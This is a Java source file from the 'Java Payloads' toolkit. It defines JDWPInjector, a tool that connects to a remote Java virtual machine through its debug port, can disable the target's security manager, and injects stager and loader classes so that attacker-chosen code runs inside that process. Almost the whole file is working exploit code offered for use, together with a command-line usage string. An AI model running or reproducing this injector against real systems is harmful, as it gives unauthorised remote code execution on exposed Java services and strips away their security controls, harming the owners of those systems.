/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import javapayload.handler.stager.StagerHandler;

import com.sun.jdi.ClassType;
import com.sun.jdi.ThreadReference;
import com.sun.jdi.VirtualMachine;
import com.sun.jdi.VirtualMachineManager;
import com.sun.jdi.connect.AttachingConnector;
import com.sun.jdi.connect.ListeningConnector;
import com.sun.jdi.connect.Connector.Argument;
import com.sun.jdi.event.Event;
import com.sun.jdi.event.EventIterator;
import com.sun.jdi.event.EventSet;
import com.sun.jdi.event.StepEvent;
import com.sun.jdi.request.StepRequest;

public class JDWPInjector {

	public static ClassType inject(VirtualMachine vm, byte[][] classes, String embeddedArgs, boolean disableSecurityManager, PrintStream consoleOut) throws Exception {
		ClassType result = null;
		consoleOut.println("== Preparing...");
		if (vm.eventRequestManager().stepRequests().size() > 0) {
			throw new RuntimeException("Some threads are currently stepping");
		}
		for (int i = 0; i < vm.allThreads().size(); i++) {
			final ThreadReference tr = (ThreadReference) vm.allThreads().get(i);
			vm.eventRequestManager().createStepRequest(tr, StepRequest.STEP_MIN, StepRequest.STEP_INTO).enable();
		}
		final com.sun.jdi.event.EventQueue q = vm.eventQueue();
		boolean done = false;
		consoleOut.println("== Handling events...");
		vm.resume();
		while (true) {
			final EventSet es;
			if (!done) {
				es = q.remove();
			} else {
				es = q.remove(1000);
				if (es == null) {
					break;
				}
			}
			for (final EventIterator ei = es.eventIterator(); ei.hasNext();) {
				final Event e = ei.nextEvent();
				consoleOut.println("== Event received: " + e.toString());
				if (!done && e instanceof StepEvent) {
					final StepEvent se = (StepEvent) e;
					final ThreadReference tr = se.thread();
					vm.eventRequestManager().deleteEventRequest(se.request());
					final List stepRequests = new ArrayList(vm.eventRequestManager().stepRequests());
					for (int i = 0; i < stepRequests.size(); i++) {
						((StepRequest) stepRequests.get(i)).disable();
					}
					if (disableSecurityManager) {
						consoleOut.println("== Disabling security manager...");
						ClassType _System = (ClassType) vm.classesByName("java.lang.System").get(0);
						_System.setValue(_System.fieldByName("security"), null);
					}
					consoleOut.println("== Trying to inject...");
					try {
						final JDWPClassInjector ci = new JDWPClassInjector(tr);
						for (int i = 0; i < classes.length; i++) {
							ClassType ct = ci.inject(classes[i], i == classes.length - 1 ? embeddedArgs : null);
							if (i==0) result = ct;
						}
						consoleOut.println("== done.");
						done = true;
						for (int i = 0; i < stepRequests.size(); i++) {
							vm.eventRequestManager().deleteEventRequest((StepRequest) stepRequests.get(i));
						}
					} catch (final Throwable ex) {
						ex.printStackTrace();
						for (int i = 0; i < stepRequests.size(); i++) {
							((StepRequest) stepRequests.get(i)).enable();
						}
					}
				}
			}
			es.resume();
		}
		return result;
	}

	public static void main(String[] args) throws Exception {
		if (args.length < 4) {
			System.out.println("Usage: java javapayload.builder.JDWPInjector <port|hostname:port|port!|hostname:port!> <stager> [stageroptions] -- <stage> [stageoptions]");
			return;
		}
		final String[] stagerArgs = new String[args.length - 1];
		for (int i = 1; i < args.length; i++) {
			stagerArgs[i - 1] = args[i];
		}
		StagerHandler.Loader loader = new StagerHandler.Loader(stagerArgs);
		inject(args[0], loader, stagerArgs);
	}
	
	public static void inject(String connector, final StagerHandler.Loader loader, String[] stagerArgs) throws Exception {
		final String stager = stagerArgs[0];
		final VirtualMachineManager vmm = com.sun.jdi.Bootstrap.virtualMachineManager();
		VirtualMachine vm = null;
		boolean disableSecurityManager = false;
		if (connector.endsWith("!")) {
			disableSecurityManager = true;
			connector = connector.substring(0, connector.length()-1);
		}
		final int pos = connector.lastIndexOf(':');
		if (pos == -1) {
			final int port = Integer.parseInt(connector);
			for (int i = 0; i < vmm.listeningConnectors().size(); i++) {
				final ListeningConnector lc = (ListeningConnector) vmm.listeningConnectors().get(i);
				if (lc.name().equals("com.sun.jdi.SocketListen")) {
					final Map connectorArgs = lc.defaultArguments();
					((Argument) connectorArgs.get("port")).setValue("" + port);
					lc.startListening(connectorArgs);
					vm = lc.accept(connectorArgs);
					lc.stopListening(connectorArgs);
				}
			}
		} else {
			final int port = Integer.parseInt(connector.substring(pos + 1));
			for (int i = 0; i < vmm.attachingConnectors().size(); i++) {
				final AttachingConnector ac = (AttachingConnector) vmm.attachingConnectors().get(i);
				if (ac.name().equals("com.sun.jdi.SocketAttach")) {
					final Map connectorArgs = ac.defaultArguments();
					((Argument) connectorArgs.get("hostname")).setValue(connector.substring(0, pos));
					((Argument) connectorArgs.get("port")).setValue("" + port);
					vm = ac.attach(connectorArgs);
					break;
				}
			}
		}
		boolean isJDWPTunnelStager = stager.equals("JDWPTunnel");
		loader.handleBefore(loader.stageHandler.consoleErr, null); // may modify stagerArgs
		final StringBuffer embeddedArgs = new StringBuffer();
		for (int i = 0; i < stagerArgs.length; i++) {
			if (i != 0) {
				embeddedArgs.append("\n");
			}
			embeddedArgs.append("$").append(stagerArgs[i]);
		}
		Class[] classes = new Class[] { 
				javapayload.stager.Stager.class,
				Class.forName("javapayload.stager." + stager),
				javapayload.loader.JDWPLoader.class
		};
		if (isJDWPTunnelStager) {
			classes = new Class[] {
					javapayload.loader.JDWPCommunication.class,
					javapayload.stager.Stager.class,
					javapayload.stager.JDWPTunnel.class, 
					javapayload.loader.JDWPLoader.class
			};
		}
		final byte[][] classBytes = new byte[classes.length][];
		for (int i = 0; i < classes.length; i++) {
			final InputStream in = JDWPInjector.class.getResourceAsStream("/" + classes[i].getName().replace('.', '/') + ".class");
			final ByteArrayOutputStream out = new ByteArrayOutputStream();
			final byte[] tmp = new byte[4096];
			int len;
			while ((len = in.read(tmp)) != -1) {
				out.write(tmp, 0, len);
			}
			in.close();
			out.close();
			classBytes[i] = out.toByteArray();
			if (classBytes[i] == null) {
				throw new RuntimeException();
			}
		}
		ClassType firstInjectedClass = inject(vm, classBytes, embeddedArgs.toString(), disableSecurityManager, loader.stageHandler.consoleOut);

		if (isJDWPTunnelStager) {
			loader.handleAfter(loader.stageHandler.consoleErr, firstInjectedClass);
		} else {
			vm.dispose();
			loader.handleAfter(loader.stageHandler.consoleErr, null);
		}
	}
}
